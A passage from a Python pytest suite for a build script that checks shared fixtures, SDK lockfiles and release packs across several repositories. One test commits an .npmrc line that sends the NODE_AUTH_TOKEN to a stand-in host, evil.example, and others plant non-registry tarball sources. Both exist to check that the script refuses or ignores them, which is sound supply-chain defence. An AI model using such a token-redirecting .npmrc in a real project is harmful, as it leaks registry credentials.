    "match-vectors.json": b'{"about": []}\n',
    "valid/facility/injector.json": b'{"name": "Injector"}\n',
    "valid/personal/grid.json": b'{"layout": {"split": "row"}}\n',
    "invalid/not-utf8.json": NOT_UTF8,
    "invalid/not-a-file.json/keep": b"",
    "responses/state.json": b'{"collections": []}\n',
}


def commit_bytes(repo: Path, files: dict[str, bytes | None], message: str) -> str:
    """Commit raw bytes (None deletes)."""
    for name, data in files.items():
        f = repo / name
        if data is None:
            f.unlink()
        else:
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_bytes(data)
    return commit(repo, {}, message)


def fixtures(prefix: str, files: dict[str, bytes | None]) -> dict[str, bytes | None]:
    return {f"{prefix}/{name}": data for name, data in files.items()}


def with_fixtures(world: dict, canopy: dict | None = None, rt: dict | None = None) -> None:
    """Commit the fixture set to both repos' HEAD; ``canopy``/``rt`` override single files."""
    commit_bytes(world["canopy"], fixtures(FIX_CANOPY, {**FIXTURE_SET, **(canopy or {})}), "fixtures")
    commit_bytes(world["rt"], fixtures(FIX_RT, {**FIXTURE_SET, **(rt or {})}), "fixtures")


def refused(world: dict, proc, path: str) -> None:
    assert proc.returncode != 0, proc.stdout + proc.stderr
    assert f"collections fixture {path} " in proc.stderr
    assert not world["out"].exists() or not (world["out"] / "STAGED.json").exists()
    # The comparison runs before any tool: a refusal builds nothing.
    assert calls(world) == []


def test_runtime_without_the_fixture_dir_records_absent(world):
    # Canopy carries fixtures the runtime commit predates: nothing to compare.
    commit_bytes(world["canopy"], fixtures(FIX_CANOPY, FIXTURE_SET), "fixtures")
    proc = build(world)
    ok(proc)
    assert staged(world)["fixtures"] == "absent"
    assert "fixtures absent" in proc.stderr


def test_identical_fixture_sets_record_compared(world):
    with_fixtures(world)
    proc = build(world)
    ok(proc)
    assert staged(world)["fixtures"] == "compared"
    assert "fixtures compared" in proc.stderr


def test_a_byte_difference_is_refused_naming_the_path(world):
    with_fixtures(world, rt={"valid/personal/grid.json": b'{"layout": {"split": "column"}}\n'})
    proc = build(world)
    refused(world, proc, "valid/personal/grid.json")
    assert "differs between" in proc.stderr


def test_a_non_utf8_byte_difference_is_refused(world):
    with_fixtures(world, canopy={"invalid/not-utf8.json": NOT_UTF8.replace(b"\xfe", b"\xfd")})
    refused(world, build(world), "invalid/not-utf8.json")


def test_the_first_differing_path_is_named(world):
    with_fixtures(
        world,
        rt={"responses/state.json": b"{}\n", "invalid/not-utf8.json": b"{}\n", "valid/personal/grid.json": b"{}\n"},
    )
    refused(world, build(world), "invalid/not-utf8.json")


def test_a_fixture_only_in_the_runtime_is_refused(world):
    with_fixtures(world, rt={"responses/extra.json": b"{}\n"})
    proc = build(world)
    refused(world, proc, "responses/extra.json")
    assert "is in RT_SHA=" in proc.stderr


def test_a_fixture_only_in_canopy_is_refused(world):
    with_fixtures(world, canopy={"invalid/extra.json": b"{}\n"})
    proc = build(world)
    refused(world, proc, "invalid/extra.json")
    assert "is in CANOPY_SHA=" in proc.stderr


def test_a_runtime_dir_without_canopy_fixtures_is_refused(world):
    commit_bytes(world["rt"], fixtures(FIX_RT, FIXTURE_SET), "fixtures")
    refused(world, build(world), "invalid/not-a-file.json/keep")


def test_a_fixture_deleted_on_one_side_is_refused(world):
    with_fixtures(world)
    commit_bytes(world["rt"], fixtures(FIX_RT, {"member-key-vectors.json": None}), "drop")
    refused(world, build(world), "member-key-vectors.json")


def test_match_vectors_dropped_by_the_runtime_is_refused(world):
    with_fixtures(world)
    commit_bytes(world["rt"], fixtures(FIX_RT, {"match-vectors.json": None}), "drop")
    proc = build(world)
    refused(world, proc, "match-vectors.json")
    assert "is in CANOPY_SHA=" in proc.stderr


def test_library_and_other_paths_are_not_compared(world):
    with_fixtures(
        world,
        canopy={"library/site.json": b'{"canopy": 1}\n', "README.md": b"canopy\n"},
        rt={"library/site.json": b'{"runtime": 2}\n', "notes.txt": b"rt\n"},
    )
    ok(build(world))
    assert staged(world)["fixtures"] == "compared"


def test_the_recorded_commits_are_compared_not_head(world):
    with_fixtures(world)
    matching = head(world["canopy"])
    # Canopy's HEAD drifts from the runtime; the recorded CANOPY_SHA does not.
    commit_bytes(world["canopy"], fixtures(FIX_CANOPY, {"responses/state.json": b"{}\n"}), "drift")
    ok(build(world, CANOPY_SHA=matching, CANOPY_VERSION="1.2.2"))
    assert staged(world)["fixtures"] == "compared"
    assert staged(world)["canopy"] == matching


def test_a_drifted_recorded_commit_is_refused_even_when_head_matches(world):
    with_fixtures(world)
    commit_bytes(world["rt"], fixtures(FIX_RT, {"responses/state.json": b"{}\n"}), "drift")
    drifted = head(world["rt"])
    commit_bytes(world["rt"], fixtures(FIX_RT, {"responses/state.json": FIXTURE_SET["responses/state.json"]}), "back")
    refused(world, build(world, RT_SHA=drifted), "responses/state.json")


def test_uncommitted_fixture_edits_are_not_compared(world):
    with_fixtures(world)
    (world["rt"] / FIX_RT / "valid" / "personal" / "grid.json").write_bytes(b"edited\n")
    (world["canopy"] / FIX_CANOPY / "responses" / "new.json").write_bytes(b"{}\n")
    ok(build(world))
    assert staged(world)["fixtures"] == "compared"


def test_help_names_the_fixture_check(world):
    proc = build(world, "--help", out=False)
    ok(proc)
    assert "fixtures" in proc.stdout
    assert FIX_RT in proc.stdout


# --- the compared workspace fixture set ---------------------------------------------

WS_CANOPY = "tests/canopy_mcp/fixtures/workspace"
WS_RT = "apps/viewer/e2e/fixtures/workspace"
WORKSPACE_SET = {
    "commands/open.json": b'{"args": {"ref": "string"}}\n',
    "rejections/tab_limit.json": b'{"cases": []}\n',
    "routes/claim.json": b'{"route": "claim"}\n',
    "scenarios/expiry.json": b'{"steps": []}\n',
    "context.json": b'{"context": {}}\n',
    "state.sample.json": b'{"tabs": []}\n',
    "README.md": b"workspace\n",
    "bytes.bin": NOT_UTF8,
}


def with_workspace(world: dict, canopy: dict | None = None, rt: dict | None = None) -> None:
    """Commit the workspace set to both repos' HEAD; ``canopy``/``rt`` override single files."""
    commit_bytes(world["canopy"], fixtures(WS_CANOPY, {**WORKSPACE_SET, **(canopy or {})}), "workspace")
    commit_bytes(world["rt"], fixtures(WS_RT, {**WORKSPACE_SET, **(rt or {})}), "workspace")


def workspace_refused(world: dict, proc, path: str) -> None:
    assert proc.returncode != 0, proc.stdout + proc.stderr
    assert f"workspace fixture {path} " in proc.stderr
    assert not world["out"].exists() or not (world["out"] / "STAGED.json").exists()
    assert calls(world) == []


def test_build_payload_workspace_absent_when_neither_has_it(world):
    proc = build(world)
    ok(proc)
    assert staged(world)["workspace"] == "absent"
    assert "workspace absent" in proc.stderr


def test_build_payload_workspace_equal_copies_record_compared(world):
    with_workspace(world)
    proc = build(world)
    ok(proc)
    assert staged(world)["workspace"] == "compared"
    assert "workspace compared" in proc.stderr
    # The collections check is independent of the workspace one.
    assert staged(world)["fixtures"] == "absent"


def test_build_payload_workspace_and_collections_both_compared(world):
    with_fixtures(world)
    with_workspace(world)
    ok(build(world))
    assert staged(world)["fixtures"] == "compared"
    assert staged(world)["workspace"] == "compared"


def test_build_payload_workspace_byte_difference_is_refused(world):
    with_workspace(world, rt={"scenarios/expiry.json": b'{"steps": [1]}\n'})
    proc = build(world)
    workspace_refused(world, proc, "scenarios/expiry.json")
    assert "differs between" in proc.stderr
    assert f"({WS_CANOPY}/ vs {WS_RT}/)" in proc.stderr


def test_build_payload_workspace_non_utf8_difference_is_refused(world):
    with_workspace(world, canopy={"bytes.bin": NOT_UTF8.replace(b"\xfe", b"\xfd")})
    workspace_refused(world, build(world), "bytes.bin")


def test_build_payload_workspace_every_file_is_compared(world):
    # Unlike the collections set, no path below the directory is exempt.
    with_workspace(world, rt={"README.md": b"runtime\n"})
    workspace_refused(world, build(world), "README.md")


def test_build_payload_workspace_first_differing_path_is_named(world):
    with_workspace(world, rt={"state.sample.json": b"{}\n", "context.json": b"{}\n", "routes/claim.json": b"{}\n"})
    workspace_refused(world, build(world), "context.json")


def test_build_payload_workspace_only_in_canopy_is_refused(world):
    commit_bytes(world["canopy"], fixtures(WS_CANOPY, WORKSPACE_SET), "workspace")
    proc = build(world)
    workspace_refused(world, proc, "README.md")
    assert "is in CANOPY_SHA=" in proc.stderr


def test_build_payload_workspace_only_in_the_runtime_is_refused(world):
    commit_bytes(world["rt"], fixtures(WS_RT, WORKSPACE_SET), "workspace")
    proc = build(world)
    workspace_refused(world, proc, "README.md")
    assert "is in RT_SHA=" in proc.stderr


def test_build_payload_workspace_extra_file_on_one_side_is_refused(world):
    with_workspace(world, canopy={"commands/close.json": b"{}\n"})
    proc = build(world)
    workspace_refused(world, proc, "commands/close.json")
    assert "is in CANOPY_SHA=" in proc.stderr


def test_build_payload_workspace_file_deleted_on_one_side_is_refused(world):
    with_workspace(world)
    commit_bytes(world["rt"], fixtures(WS_RT, {"routes/claim.json": None}), "drop")
    proc = build(world)
    workspace_refused(world, proc, "routes/claim.json")
    assert "is in CANOPY_SHA=" in proc.stderr


def test_build_payload_workspace_recorded_commits_are_compared_not_head(world):
    with_workspace(world)
    matching = head(world["rt"])
    commit_bytes(world["rt"], fixtures(WS_RT, {"context.json": b"{}\n"}), "drift")
    ok(build(world, RT_SHA=matching))
    assert staged(world)["workspace"] == "compared"
    assert staged(world)["runtime"] == matching


def test_build_payload_workspace_recorded_canopy_commit_without_it_is_refused(world):
    # The runtime HEAD carries the copy; the recorded canopy commit predates it.
    before = head(world["canopy"])
    with_workspace(world)
    proc = build(world, CANOPY_SHA=before, CANOPY_VERSION="1.2.2")
    workspace_refused(world, proc, "README.md")
    assert "is in RT_SHA=" in proc.stderr


def test_build_payload_workspace_uncommitted_edits_are_not_compared(world):
    with_workspace(world)
    (world["rt"] / WS_RT / "context.json").write_bytes(b"edited\n")
    (world["canopy"] / WS_CANOPY / "commands" / "new.json").write_bytes(b"{}\n")
    ok(build(world))
    assert staged(world)["workspace"] == "compared"


def test_build_payload_help_names_the_workspace_check(world):
    proc = build(world, "--help", out=False)
    ok(proc)
    assert "workspace" in proc.stdout
    assert WS_CANOPY in proc.stdout
    assert WS_RT in proc.stdout


# --- the compared vector files ---------------------------------------------------

VEC_CANOPY = "src/canopy/contracts"
VEC_SDK = "packages/client/test-vectors"
VECTORS = {
    "heartbeat_vectors.json": b'{"contract": "machine statement"}\n',
    # Not UTF-8 on purpose: the comparison is by bytes.
    "write_outcome_vectors.json": b'{"vectors": [{"outcome": "written", "note": "\xff"}]}\n',
}


def with_vectors(world: dict, canopy: dict | None = None, sdk: dict | None = None) -> None:
    """Commit the vector files to canopy's HEAD and the SDK's.

    ``canopy``/``sdk`` override single files (None leaves the file out of that side).
    """
    for repo, prefix, override in ((world["canopy"], VEC_CANOPY, canopy), (world["sdk"], VEC_SDK, sdk)):
        files = {k: v for k, v in {**VECTORS, **(override or {})}.items() if v is not None}
        if files:
            commit_bytes(repo, fixtures(prefix, files), "vectors")


def vector_refused(world: dict, proc, name: str) -> None:
    assert proc.returncode != 0, proc.stdout + proc.stderr
    assert f"vector file {name} " in proc.stderr
    assert not world["out"].exists() or not (world["out"] / "STAGED.json").exists()
    # The comparison runs before any tool: a refusal builds nothing.
    assert calls(world) == []


def test_without_vector_files_on_either_side_records_absent(world):
    proc = build(world)
    ok(proc)
    assert staged(world)["vectors"] == "absent"
    assert "vectors absent" in proc.stderr


def test_identical_vector_files_record_compared(world):
    with_vectors(world)
    proc = build(world)
    ok(proc)
    assert staged(world)["vectors"] == "compared"
    assert "vectors compared" in proc.stderr


def test_one_byte_changed_in_the_sdk_write_outcome_copy_is_refused_naming_the_file(world):
    with_vectors(
        world, sdk={"write_outcome_vectors.json": VECTORS["write_outcome_vectors.json"].replace(b"written", b"writtem")}
    )
    proc = build(world)
    vector_refused(world, proc, "write_outcome_vectors.json")
    assert "differs between CANOPY_SHA=" in proc.stderr
    assert f"SDK_SHA={head(world['sdk'])}" in proc.stderr


def test_a_non_utf8_byte_changed_in_the_sdk_copy_is_refused(world):
    with_vectors(
        world, sdk={"write_outcome_vectors.json": VECTORS["write_outcome_vectors.json"].replace(b"\xff", b"\xfe")}
    )
    vector_refused(world, build(world), "write_outcome_vectors.json")


def test_a_vector_file_missing_from_the_sdk_is_refused(world):
    with_vectors(world, sdk={"write_outcome_vectors.json": None})
    proc = build(world)
    vector_refused(world, proc, "write_outcome_vectors.json")
    assert "is in CANOPY_SHA=" in proc.stderr
    assert "but not in SDK_SHA=" in proc.stderr


def test_a_vector_file_missing_from_canopy_is_refused(world):
    with_vectors(world, canopy={"write_outcome_vectors.json": None})
    proc = build(world)
    vector_refused(world, proc, "write_outcome_vectors.json")
    assert "is in SDK_SHA=" in proc.stderr


def test_a_heartbeat_vector_file_missing_from_the_sdk_is_refused(world):
    with_vectors(world, sdk={"heartbeat_vectors.json": None})
    proc = build(world)
    vector_refused(world, proc, "heartbeat_vectors.json")
    assert "but not in SDK_SHA=" in proc.stderr


def test_canopy_vectors_against_an_sdk_commit_without_them_are_refused(world):
    # Canopy carries the vectors; the SDK commit predates them.
    commit_bytes(world["canopy"], fixtures(VEC_CANOPY, VECTORS), "vectors")
    # C-sorted: the first file missing from the SDK is the one named.
    vector_refused(world, build(world), "heartbeat_vectors.json")


def test_the_recorded_sdk_commit_is_compared_not_sdk_head(world):
    with_vectors(world)
    matching = head(world["sdk"])
    commit_bytes(world["sdk"], fixtures(VEC_SDK, {"write_outcome_vectors.json": b"{}\n"}), "drift")
    ok(build(world, SDK_SHA=matching))
    assert staged(world)["vectors"] == "compared"


def test_the_recorded_canopy_commit_is_compared_not_head(world):
    with_vectors(world)
    matching = head(world["canopy"])
    commit_bytes(world["canopy"], fixtures(VEC_CANOPY, {"write_outcome_vectors.json": b"{}\n"}), "drift")
    ok(build(world, CANOPY_SHA=matching, CANOPY_VERSION="1.2.2"))
    assert staged(world)["vectors"] == "compared"


def test_uncommitted_vector_edits_are_not_compared(world):
    with_vectors(world)
    (world["sdk"] / VEC_SDK / "write_outcome_vectors.json").write_bytes(b"edited\n")
    (world["canopy"] / VEC_CANOPY / "write_outcome_vectors.json").write_bytes(b"edited\n")
    ok(build(world))
    assert staged(world)["vectors"] == "compared"


def test_help_names_the_vector_check(world):
    proc = build(world, "--help", out=False)
    ok(proc)
    assert "vectors" in proc.stdout
    assert VEC_SDK in proc.stdout
    assert "write_outcome_vectors.json" in proc.stdout


def test_workspace_and_vector_checks_are_recorded_side_by_side(world):
    with_workspace(world)
    with_vectors(world)
    ok(build(world))
    assert staged(world)["workspace"] == "compared"
    assert staged(world)["vectors"] == "compared"


# --- one SDK per payload ---------------------------------------------------------


def refused_before_any_install(world: dict, proc, *fragments: str) -> None:
    """Refused by the one-SDK check: after the installs, before the viewer or Trace is built."""
    assert proc.returncode != 0, proc.stdout + proc.stderr
    for fragment in fragments:
        assert fragment in proc.stderr, proc.stderr
    assert not [c for c in calls(world) if c[0] == "pnpm" and not c[2].startswith("install")]
    assert not (world["out"] / "STAGED.json").exists()


def test_the_sdk_commit_has_no_default(world):
    proc = build(world, unset=("SDK_SHA",))
    assert proc.returncode != 0
    assert "set SDK_SHA" in proc.stderr
    assert calls(world) == []


def test_the_recorded_sdk_commit_is_not_the_sdk_head(world):
    ok(build(world, SDK_SHA=first(world["sdk"])))
    assert staged(world)["sdk"] == first(world["sdk"])


def test_shared_fixtures_are_checked_without_any_gitlink(world):
    # The clean tops have no submodule: the comparison must still be reached.
    with_fixtures(world)
    with_workspace(world)
    with_vectors(world)
    for repo in (world["rt"], world["trace"]):
        assert "160000" not in git(repo, "ls-tree", "-r", "HEAD")
    ok(build(world))
    s = staged(world)
    assert (s["fixtures"], s["workspace"], s["vectors"]) == ("compared", "compared", "compared")


def test_another_sdk_version_in_trace_is_refused(world):
    commit(world["trace"], {"pnpm-lock.yaml": sdk_lock(*TRACE_PACKAGES, client=("0.2.0", "sha512-old=="))}, "old")
    refused_before_any_install(
        world, build(world), "@slaclab/canopy-client", "0.2.0", SDK_VERSION, "RT_SHA=", "TRACE_SHA=", "one SDK"
    )


def test_the_same_version_with_another_integrity_is_refused(world):
    # A rebuilt pack under one version number: not the same SDK.
    lock = sdk_lock(*RT_PACKAGES, shell=(SDK_VERSION, "sha512-rebuilt=="))
    commit(world["rt"], {"pnpm-lock.yaml": lock}, "pack")
    refused_before_any_install(world, build(world), "@slaclab/canopy-shell", "sha512-rebuilt==", INTEGRITY["shell"])


def test_a_package_on_one_side_only_is_not_compared_but_is_recorded(world):
    ok(build(world))
    packages = staged(world)["sdk_packages"]
    assert "@slaclab/canopy-screen-ir" in packages["runtime"]
    assert "@slaclab/canopy-screen-ir" not in packages["trace"]


def test_no_trace_records_only_the_runtime_and_compares_nothing(world):
    commit(world["trace"], {"pnpm-lock.yaml": sdk_lock(*TRACE_PACKAGES, client=("0.2.0", "sha512-old=="))}, "old")
    ok(build(world, "--no-trace"))
    packages = staged(world)["sdk_packages"]
    assert packages["trace"] is None
    assert set(packages["runtime"]) == {f"@slaclab/canopy-{p}" for p in RT_PACKAGES}


@pytest.mark.parametrize("repo,label", [("rt", "runtime"), ("trace", "Trace")])
def test_a_lockfile_without_the_sdk_is_refused(world, repo, label):
    commit(world[repo], {"pnpm-lock.yaml": lockfile({})}, "no sdk")
    refused_before_any_install(world, build(world), f"the {label} ", "does not resolve @slaclab/", "canopy-client")


def test_a_package_missing_from_the_fixed_set_is_refused(world):
    commit(world["rt"], {"pnpm-lock.yaml": sdk_lock("client", "react", "shell")}, "no screen-ir")
    refused_before_any_install(world, build(world), "does not resolve @slaclab/canopy-screen-ir")


def test_a_package_outside_the_fixed_set_is_refused(world):
    # canopy-screen-ir is the runtime's, not Trace's, even though the SDK holds it.
    commit(world["trace"], {"pnpm-lock.yaml": trace_lock(sdk_lock(*TRACE_PACKAGES, "screen-ir"))}, "extra")
    refused_before_any_install(world, build(world), "@slaclab/canopy-screen-ir is neither in the fixed set")


def test_the_trace_takes_charts_react_and_vite_from_the_one_sdk(world):
    # react-trace's three pages: charts (with shell as its peer), react, and vite as a dev dependency.
    assert f"      '@slaclab/canopy-shell': ^{SDK_VERSION}\n" in TRACE_LOCK
    assert "    devDependencies:\n      '@slaclab/canopy-vite':" in TRACE_LOCK
    ok(build(world))
    trace = staged(world)["sdk_packages"]["trace"]
    assert trace == {f"@slaclab/canopy-{p}": resolved_entry(p) for p in TRACE_PACKAGES}


def test_a_peer_outside_the_fixed_set_is_refused(world):
    commit(world["trace"], {"pnpm-lock.yaml": trace_lock(sdk_lock(*TRACE_PACKAGES), peer="screen-ir")}, "peer")
    refused_before_any_install(world, build(world), "names a peer outside the fixed package set", "canopy-screen-ir")


def test_an_sdk_peer_of_a_package_outside_the_sdk_is_refused(world):
    other = "  '@rolldown/pluginutils@1.0.1':\n    resolution: {integrity: sha512-other==}\n"
    peer = f"    peerDependencies:\n      '@slaclab/canopy-shell': ^{SDK_VERSION}\n"
    commit(world["trace"], {"pnpm-lock.yaml": TRACE_LOCK.replace(other, other + peer, 1)}, "peer")
    refused_before_any_install(world, build(world), "is not a form this check reads", "canopy-shell")


def test_a_transitive_package_outside_the_fixed_set_is_refused(world):
    # No importer asks for it: only the packages section names it.
    entry = f"  '@slaclab/canopy-charts@{SDK_VERSION}':\n    resolution: {{integrity: sha512-charts==}}\n\nsnapshots:"
    commit(world["rt"], {"pnpm-lock.yaml": RT_LOCK.replace("snapshots:", entry)}, "transitive")
    refused_before_any_install(world, build(world), "is not in the fixed package set", "@slaclab/canopy-charts@")


@pytest.mark.parametrize("name,label", [("canopy-screen-runtime", "runtime"), ("react-trace", "Trace")])
def test_a_failed_install_stops_the_build(world, name, label):
    proc = build(world, STUB_FAIL_INSTALL=name)
    assert proc.returncode != 0
    assert f"installing the {label} export of" in proc.stderr
    assert not [c for c in calls(world) if c[0] == "pnpm" and not c[2].startswith("install")]
    assert not (world["out"] / "STAGED.json").exists()


def test_every_install_re_resolves_onto_the_packs_and_runs_no_scripts(world):
    ok(build(world))
    installs = {argv for tool, _, argv, _ in calls(world) if tool == "pnpm" and argv.startswith("install")}
    assert installs == {INSTALL}


def test_the_check_reads_the_recorded_commit_not_the_working_tree(world):
    # The working tree holds a good lockfile; the recorded commit does not.
    good = head(world["trace"])
    commit(world["trace"], {"pnpm-lock.yaml": lockfile({})}, "bad")
    bad = head(world["trace"])
    git(world["trace"], "checkout", "-q", good, "--", "pnpm-lock.yaml")
    refused_before_any_install(world, build(world, TRACE_REF=bad), "does not resolve")


def test_two_versions_in_one_lockfile_are_refused(world):
    entry = "  '@slaclab/canopy-client@0.2.0':\n    resolution: {integrity: sha512-old==}\n\nsnapshots:"
    commit(world["rt"], {"pnpm-lock.yaml": RT_LOCK.replace("snapshots:", entry)}, "two")
    refused_before_any_install(world, build(world), "more than one version", "@slaclab/canopy-client")


CLIENT_KEY = f"  '@slaclab/canopy-client@{SDK_VERSION}':"
CLIENT_RESOLUTION = f"    resolution: {{integrity: {INTEGRITY['client']}}}"
CLIENT_IMPORTER = f"        specifier: ^{SDK_VERSION}\n        version: {SDK_VERSION}"


@pytest.mark.parametrize(
    "old,new,why",
    [
        pytest.param(CLIENT_KEY, "  '@slaclab/canopy-client@npm:other@1.0.0':", "plain registry version", id="alias"),
        pytest.param(CLIENT_KEY, "  '@slaclab/canopy-client@link:../x':", "plain registry version", id="link"),
        pytest.param(CLIENT_KEY, "  '@slaclab/canopy-client@file:../x.tgz':", "plain registry version", id="file"),
        pytest.param(CLIENT_KEY, "  '@slaclab/canopy-client@https://e.org/x.tgz':", "plain registry version", id="url"),
        pytest.param(
            CLIENT_RESOLUTION,
            CLIENT_RESOLUTION.replace("}", ", tarball: https://e.org/x.tgz}"),
            "field other than a registry integrity",
            id="tarball",
        ),
        pytest.param(
            CLIENT_RESOLUTION,
            CLIENT_RESOLUTION.replace("integrity: ", "type: git, integrity: "),
            "field other than a registry integrity",
            id="other-resolution-field",
        ),
        pytest.param(
            CLIENT_RESOLUTION,
            "    resolution:\n      integrity: sha512-client==",
            "field other than a registry integrity",
            id="unrecognised-layout",
        ),
        pytest.param(
            CLIENT_RESOLUTION,
            CLIENT_RESOLUTION + "\n    version: 0.3.0",
            "field other than a registry integrity",
            id="extra-entry-field",
        ),
        pytest.param(
            CLIENT_IMPORTER,
            "        specifier: npm:other@1.0.0\n        version: other@1.0.0",
            "something other than a registry version",
            id="importer-alias",
        ),
        pytest.param(
            CLIENT_IMPORTER,
            f"        specifier: ^{SDK_VERSION}\n        version: link:../x",
            "something other than a registry version",
            id="importer-link",
        ),
        pytest.param(
            f"  '@slaclab/canopy-client@{SDK_VERSION}(react@19.2.7)':",
            "  '@slaclab/canopy-client@file:../x.tgz(react@19.2.7)':",
            "not a form this check reads",
            id="snapshot-file",
        ),
        pytest.param(
            "importers:",
            "overrides:\n  '@slaclab/canopy-client': file:../x.tgz\n\nimporters:",
            "names the SDK in section overrides",
            id="overrides-section",
        ),
        pytest.param(
            "lockfileVersion: '9.0'", "lockfileVersion: '10.0'", "not lockfile version 9.0", id="lock-version"
        ),
    ],
)
def test_a_lockfile_entry_that_is_not_a_registry_package_is_refused(world, old, new, why):
    assert old in RT_LOCK
    commit(world["rt"], {"pnpm-lock.yaml": RT_LOCK.replace(old, new, 1)}, "not the registry")
    refused_before_any_install(world, build(world), why)


def test_a_workspace_link_may_not_shadow_an_sdk_package(world):
    # canopy-charts is not in the runtime's fixed set, but the SDK holds it.
    commit(
        world["sdk"],
        {"packages/charts/package.json": '{"name": "@slaclab/canopy-charts", "version": "0.3.0"}'},
        "charts",
    )
    lock = sdk_lock(*RT_PACKAGES, workspace=("charts",))
    commit(world["rt"], {"pnpm-lock.yaml": lock}, "shadow")
    refused_before_any_install(world, build(world), "neither in the fixed set nor a workspace package")


def test_a_version_used_but_not_resolved_is_refused(world):
    lock = RT_LOCK.replace(f"canopy-shell@{SDK_VERSION}(react@19.2.7)", "canopy-shell@0.2.0(react@19.2.7)")
    commit(world["rt"], {"pnpm-lock.yaml": lock}, "snapshot")
    refused_before_any_install(world, build(world), "uses @slaclab/canopy-shell@0.2.0")


def bump_sdk(world: dict, version: str) -> str:
    """An SDK commit whose client package is at ``version``."""
    return commit(
        world["sdk"],
        {"packages/client/package.json": json.dumps({"name": "@slaclab/canopy-client", "version": version})},
        version,
    )


def test_a_version_the_sdk_commit_does_not_hold_is_refused(world):
    other = bump_sdk(world, "0.4.0")
    refused_before_any_install(
        world, build(world), f"SDK_SHA={other}", "holds 0.4.0", f"@slaclab/canopy-client is resolved to {SDK_VERSION}"
    )


def test_the_commit_holding_the_version_passes_when_the_head_has_moved(world):
    released = head(world["sdk"])
    bump_sdk(world, "0.4.0")
    ok(build(world, SDK_SHA=released))
    assert staged(world)["sdk"] == released


def test_a_package_the_sdk_commit_does_not_have_is_refused(world):
    git(world["sdk"], "rm", "-q", "packages/react/package.json")
    git(world["sdk"], "commit", "-q", "-m", "no react")
    refused_before_any_install(
        world, build(world), f"@slaclab/canopy-react@{SDK_VERSION} is resolved", "no such package"
    )


def test_a_release_tag_on_another_commit_is_refused(world):
    git(world["sdk"], "tag", f"v{SDK_VERSION}", first(world["sdk"]))
    refused_before_any_install(world, build(world, tag=False), f"tag v{SDK_VERSION} names {first(world['sdk'])}")


def test_a_missing_release_tag_is_refused(world):
    refused_before_any_install(world, build(world, tag=False), f"tag v{SDK_VERSION} is not in")


def test_a_release_tag_on_the_sdk_commit_passes(world):
    git(world["sdk"], "tag", f"v{SDK_VERSION}")
    ok(build(world, tag=False))


# --- the packs, no registry -----------------------------------------------------------


def test_no_registry_token_reaches_any_tool(world):
    ok(build(world, NODE_AUTH_TOKEN="not-a-real-token"))
    assert not [r for r in calls(world) if r[3].endswith("TOKEN=set")]
    assert "not-a-real-token" not in world["log"].read_text()


def test_each_install_overrides_every_sdk_package_with_its_pack(world):
    ok(build(world))
    written = Path(f"{world['log']}.workspace").read_text()
    for package in PACK_BYTES:
        pack = world["packs"] / f"slaclab-canopy-{package}-{SDK_VERSION}.tgz"
        assert written.count(f"  '@slaclab/canopy-{package}': file:{pack}\n") == 2


def test_a_lockfile_naming_the_packs_by_path_reads_as_their_version(world):
    """The form pnpm writes after an override: file: specifiers, a tarball field, a version field."""
    lock = RT_LOCK
    for package in RT_PACKAGES:
        pack = world["packs"] / f"slaclab-canopy-{package}-{SDK_VERSION}.tgz"
        lock = lock.replace(
            f"specifier: ^{SDK_VERSION}\n        version: {SDK_VERSION}\n",
            f"specifier: file:{pack}\n        version: file:{pack}\n",
            1,
        )
        lock = lock.replace(
            f"  '@slaclab/canopy-{package}@{SDK_VERSION}':\n    resolution: {{integrity: {INTEGRITY[package]}}}",
            f"  '@slaclab/canopy-{package}@file:{pack}':\n    resolution: {{integrity: {INTEGRITY[package]}, tarball: file:{pack}}}\n    version: {SDK_VERSION}",
        )
    client = world["packs"] / f"slaclab-canopy-client-{SDK_VERSION}.tgz"
    lock = (
        f"lockfileVersion: '9.0'\n\noverrides:\n  '@slaclab/canopy-client': file:{client}\n\n" + lock.split("\n", 2)[2]
    )
    commit(world["rt"], {"pnpm-lock.yaml": lock}, "packs by path")
    ok(build(world))
    assert staged(world)["sdk_packages"]["runtime"]["@slaclab/canopy-client"] == resolved_entry("client")


def test_a_resolved_integrity_that_is_not_the_packs_is_refused(world):
    (world["packs"] / f"slaclab-canopy-client-{SDK_VERSION}.tgz").write_bytes(b"another pack\n")
    refused_before_any_install(world, build(world), "is not a pack in SDK_PACKS")


def test_a_second_pack_of_one_package_is_refused(world):
    (world["packs"] / "slaclab-canopy-client-0.3.0.tgz").write_bytes(b"old\n")
    refused_before_any_install(world, build(world), "more than one pack of @slaclab/canopy-client")


def test_an_empty_pack_directory_is_refused_before_any_install(world, tmp_path):
    empty = tmp_path / "no-packs"
    empty.mkdir()
    proc = build(world, SDK_PACKS=str(empty))
    assert proc.returncode != 0
    assert "holds no slaclab-canopy-*.tgz pack" in proc.stderr
    assert not [c for c in calls(world) if c[0] == "pnpm"]


@pytest.mark.parametrize("repo", ["rt", "trace"])
def test_the_install_reads_the_scripts_npmrc_not_the_commits(world, repo):
    commit(world[repo], {".npmrc": "//evil.example/:_authToken=${NODE_AUTH_TOKEN}\n"}, "elsewhere")
    ok(build(world))
    assert Path(f"{world['log']}.npmrc").read_text() == NPMRC * 2


def test_an_npmrc_symlink_in_a_commit_is_not_written_through(world, tmp_path):
    outside = tmp_path / "outside"
    outside.write_text("untouched\n")
    (world["rt"] / ".npmrc").symlink_to(outside)
    commit(world["rt"], {}, "symlink")
    ok(build(world))
    assert outside.read_text() == "untouched\n"
    assert Path(f"{world['log']}.npmrc").read_text() == NPMRC * 2


def test_help_names_the_one_sdk_check(world):
    proc = build(world, "--help", out=False)
    ok(proc)
    assert "sdk_packages" in proc.stdout
    assert "no default" in proc.stdout
    assert "vendor/canopy-sdk-js" not in proc.stdout


# --- SDK packs from a release ---------------------------------------------------------


def sha512sums(packs: Path) -> str:
    return "".join(
        f"{hashlib.sha512(pack.read_bytes()).hexdigest()}  {pack.name}\n" for pack in sorted(packs.glob("*.tgz"))
    )


def release(world: dict, tmp_path: Path, tag: str = "v1") -> Path:
    """The packs and their SHA512SUMS laid out as a GitHub release's downloads."""
    downloads = tmp_path / "release" / "releases" / "download" / tag
    shutil.copytree(world["packs"], downloads)
    (downloads / "SHA512SUMS").write_text(sha512sums(downloads))
    return downloads


def refused_before_any_tool(world: dict, proc, fragment: str) -> None:
    assert proc.returncode != 0, proc.stdout + proc.stderr
    assert fragment in proc.stderr, proc.stderr
    assert not [c for c in calls(world) if c[0] == "pnpm"]
    assert not (world["out"] / "STAGED.json").exists()


@pytest.mark.parametrize("page", ["download", "tag"])
def test_packs_are_fetched_from_a_release_url(world, tmp_path, page):
    downloads = release(world, tmp_path)
